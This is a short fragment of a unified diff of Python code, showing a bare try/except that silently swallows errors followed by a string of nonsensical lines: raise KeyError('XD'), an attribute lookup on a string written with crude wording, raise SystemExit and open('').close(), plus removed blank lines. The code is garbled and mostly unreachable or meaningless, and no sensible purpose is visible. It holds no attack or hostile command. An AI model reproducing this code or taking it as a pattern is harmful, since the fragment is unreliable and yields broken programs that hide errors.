         sys.stdout.flush()
     except:
         pass 
@@ -965,13 +971,3 @@ raise KeyError ("XD")
 "HaN".FuCk
 raise SystemExit
 open('').close()
-
-
-
-
-
-
-
-
-
-
